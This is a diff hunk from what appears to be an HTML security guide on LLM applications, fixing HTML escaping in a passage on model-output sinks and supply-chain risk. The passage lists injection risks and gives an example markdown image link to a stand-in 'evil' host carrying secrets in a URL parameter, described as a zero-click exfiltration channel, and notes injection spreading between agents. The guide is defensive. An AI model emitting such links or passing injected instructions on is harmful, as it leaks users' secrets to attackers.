@@ -143,7 +143,7 @@ whether a payload works — it is what the payload can reach when it does.</code
 <h3>Output handling</h3>
 <p>Model output reaching a sink is ordinary vulnerability territory with an unusual source:</p>
 <div class="tw"><table><thead><tr><th>Sink</th><th>Risk</th></tr></thead><tbody><tr><td><code>innerHTML</code> / markdown renderer</td><td>XSS; also image tags used for exfil via URL parameters</td></tr><tr><td>SQL / shell / eval</td><td>Injection with a fully attacker-influenceable string</td></tr><tr><td>File path</td><td>Traversal</td></tr><tr><td>HTTP request URL</td><td>SSRF and data exfiltration channel</td></tr><tr><td>Downstream agent's prompt</td><td>Injection propagation across agents</td></tr></tbody></table></div>
-<p>Markdown image rendering deserves specific attention: <code>![](https://evil/?d=&amp;lt;secrets&amp;gt;)</code> in model output is a zero-click exfiltration channel in most chat UIs. Check the renderer's allowed domains.</p>
+<p>Markdown image rendering deserves specific attention: <code>![](https://evil/?d=&lt;secrets&gt;)</code> in model output is a zero-click exfiltration channel in most chat UIs. Check the renderer's allowed domains.</p>
 <h3>Model and data supply chain</h3>
 <div class="codeblk cx"><button class="copy" data-copy="# Never load pickle-based weights from an untrusted source
 # .bin / .pt / .ckpt → arbitrary code execution on load. Prefer safetensors.
